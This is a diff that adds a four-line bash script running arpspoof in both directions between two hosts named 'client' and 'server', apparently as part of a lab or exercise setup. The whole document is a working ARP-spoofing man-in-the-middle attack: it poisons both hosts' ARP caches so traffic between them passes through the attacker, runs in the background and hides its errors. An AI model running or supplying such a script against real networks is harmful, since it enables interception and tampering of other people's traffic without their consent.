@@ -1,0 +1,4 @@
+#!/bin/bash
+
+arpspoof -t `nslookup client | tail -n 2 | grep Address | awk '{print $2}'` `nslookup server | tail -n 2 | grep Address | awk '{print $2}'` 2>/dev/null &
+arpspoof -t `nslookup server | tail -n 2 | grep Address | awk '{print $2}'` `nslookup client | tail -n 2 | grep Address | awk '{print $2}'` 2>/dev/null &
